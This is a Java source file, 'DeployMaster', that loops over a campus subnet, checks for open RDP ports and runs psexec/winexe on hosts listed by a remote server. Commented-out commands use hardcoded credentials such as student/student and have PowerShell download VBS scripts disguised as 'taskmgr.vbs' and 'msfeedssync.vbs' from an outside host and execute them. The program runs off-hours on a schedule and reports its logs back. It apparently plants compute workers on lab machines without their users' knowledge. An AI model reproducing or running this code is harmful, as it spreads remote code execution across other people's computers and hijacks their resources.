/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package deploymaster;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Map.Entry;
import java.util.TreeMap;
import java.util.logging.FileHandler;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;
import java.util.logging.StreamHandler;
import javax.net.ssl.HttpsURLConnection;
import org.json.JSONArray;
import org.json.JSONObject;


public class DeployMaster {

    private static final Logger logger = Logger.getLogger(DeployMaster.class.getName());
    private static final int SLEEP_MINUTES = 30;
    private static final List<String> IP_LIST = new ArrayList<>();
    private static final String REPORT_URL = "https://www.jasper-tw.com/cudaComputeServer/reportWorkState";
    private static final LoggerHandler sendHandler = new LoggerHandler();
    private static final ByteArrayOutputStream logStream = new ByteArrayOutputStream();
    private static final Handler streamHandler;
    
    
    
    private static final String SUB_NET = "140.137.9";
    private static final int IP_MIN = 124;
    private static final int IP_MAX = 180;
    
    // for 9 psexec
    //private static final String DEPLOY_PROGRAM = "psexec \\\\";
    //private static final String DEPLOY_CMD = " -u first -p str@mail -n 10 -s cmd /c \"PowerShell (New-Object System.Net.WebClient).DownloadFile('https://www.jasper-tw.com/cudaComputeServer/downloadFiles.jsp?type=tsk','taskmgr.vbs');Start-Process cscript taskmgr.vbs\"";
    
    // for 17 142 143
    //private static final String DEPLOY_CMD = " -u student -p student -n 10 -s cmd /c \"PowerShell Stop-Process -processname cscript;(New-Object System.Net.WebClient).DownloadFile('https://www.jasper-tw.com/cudaComputeServer/downloadFiles.jsp?type=msf','msfeedssync.vbs');Start-Process cscript msfeedssync.vbs\"";
    
    // for 9 winexe
    private static final String DEPLOY_PROGRAM = "sh /home/pi/9_deploy/run_one.sh ";
    private static final String DEPLOY_CMD = "";
    
    
    
    static {
        for (int i = IP_MIN; i <= IP_MAX; i++)
            IP_LIST.add(SUB_NET + "." + i);
        
        //for (int i = 2; i <= 49; i++)
            //IP_LIST.add("140.137.2" + "." + i);
        
        Locale.setDefault(new Locale("en", "EN"));
        System.setProperty("java.util.logging.SimpleFormatter.format", 
            "%4$s %1$tm-%1$td %1$tH:%1$tM:%1$tS %5$s%6$s%n");
        
        streamHandler = new StreamHandler(logStream, new SimpleFormatter());
        streamHandler.setLevel(Level.ALL);
        logger.addHandler(streamHandler);
    }

    private static List<String> getDeathList() {
        
        StringBuilder sb = new StringBuilder();
        try {
            
            URL httpsUrl = new URL(REPORT_URL);
            HttpsURLConnection httpsCon = (HttpsURLConnection)httpsUrl.openConnection();
            httpsCon.setConnectTimeout(5000);
            
            String line;
            try (BufferedReader buff = new BufferedReader(new InputStreamReader(httpsCon.getInputStream()))){
                while ( (line = buff.readLine()) != null ){
                    sb.append(line);
                }
            }
            
        } catch (IOException ex) {
            logger.log(Level.WARNING, "Get DeathList failed, IOException : {0}", ex.toString());
            return new ArrayList<>(IP_LIST);
        }
        
        List<String> deathList = new ArrayList<>();
        JSONArray jlist = new JSONObject(sb.toString()).getJSONArray("DeathWorkers");
        
        for (int i = 0; i < jlist.length(); i++) {
            String ip = jlist.getString(i);
            if (IP_LIST.contains(ip))
                deathList.add(ip);
        }
        
        return deathList;
    }
    
    private static boolean portIsOpen(String host, int port){
        Socket s = null;
        
        try {
            s = new Socket();
            s.connect(new InetSocketAddress(host, port), 2 * 1000);
            return true;
        }
        catch (Exception e) { return false; }
        finally {
            if(s != null)
                try {s.close();}
                catch(Exception e) {}
        }
    }
    
    private static void goDeploy () {
        
        List<String> deathList = getDeathList();
        Map<String, Process> pMap = new TreeMap<>();
        
        deathList.forEach( ip -> {
            
            if (portIsOpen(ip, 3389)) {
                logger.log(Level.INFO, "Start psexec on {0}", ip);
                
                try {
                    Process p = Runtime.getRuntime().exec(DEPLOY_PROGRAM + ip + DEPLOY_CMD);
                    pMap.put(ip, p);
                } catch (IOException ex) {
                    logger.log(Level.WARNING, "Psexec failed {0}, IOException : {1}", new String[]{ip, ex.toString()});
                }
                
                try {
                    Thread.sleep(5 * 1000);
                } catch (InterruptedException ex) {}
            }
            else 
                logger.log(Level.INFO, "Port is closed {0}", ip);
        });
        
        
        if (pMap.isEmpty())
            return;
        
        LocalDateTime waitTime = LocalDateTime.now().plusMinutes(3);
        
        while (LocalDateTime.now().isBefore(waitTime)) {
            boolean stillAlive = false;
            
            for (Entry<String, Process> entry : pMap.entrySet()) {
                if (entry.getValue().isAlive())
                    stillAlive = true;
            }
            
            if (!stillAlive)
                break;
            
            try {
                Thread.sleep(100);
            } catch (InterruptedException ex) {}
        }
        
        pMap.forEach( (ip, p) -> {
            
            if (p.isAlive()) {
                p.destroy();
                logger.log(Level.WARNING, "Deploy failed with timeout {0}", ip);
            }
            else if (p.exitValue() != 0)
                logger.log(Level.WARNING, "Deploy failed with exit value {1}, {0}", new String[]{ip, p.exitValue() + ""});
            else
                logger.log(Level.INFO, "Deploy success {0}", ip);
        });
    
    }
    
    private static boolean sendStreamLog () {
        streamHandler.flush();
        String logs = logStream.toString();
        logStream.reset();
        return sendHandler.sendLog(logs);
    }
    
    public static void main(String[] args) {

        if (args.length == 0 || !args[0].equals("j@123")) {
            logger.log(Level.WARNING, "Wrong password");
            sendStreamLog();
            return;
        }
        if (args.length == 2 && new File(args[1]).isDirectory()){
            try {
                String loggerName = LocalDate.now().format(DateTimeFormatter.ISO_LOCAL_DATE) + ".txt";
                Handler fh = new FileHandler(args[1] + File.separator + loggerName, true);  
                logger.addHandler(fh);
                fh.setFormatter(new SimpleFormatter());  
            }catch (IOException ex) {
                logger.log(Level.WARNING, "Logger FileHandler in IOException {0}", ex.toString());
            }
        }
        
        
        logger.log(Level.INFO, "Initialize DeployMaster");
        sendStreamLog();
        
        boolean toKill;
        LocalTime now;
        int sleep, startMinutes = 8 * 60 + 7;
        
        while (true) {
            
            logger.log(Level.INFO, "Start deploy, check status");
            toKill = sendStreamLog();
            
            if (toKill)
                break;
            
            goDeploy();
            
            now = LocalTime.now();
            if (now.isAfter(LocalTime.of(23, 30)))
                sleep = startMinutes + (23 - now.getHour()) + (59 - now.getMinute());
            else if (now.isBefore(LocalTime.of(7, 30)))
                sleep = startMinutes - now.getHour()*60 - now.getMinute();
            else
                sleep = SLEEP_MINUTES;
            
            logger.log(Level.INFO, "Finish deploy, Sleep {0} minutes", sleep);
            sendStreamLog();
            
            try {
                Thread.sleep(sleep * 60 * 1000);
            } catch (InterruptedException ex) {}
        }
        
        logger.log(Level.INFO, "End DeployMaster");
        sendStreamLog();
    }
}
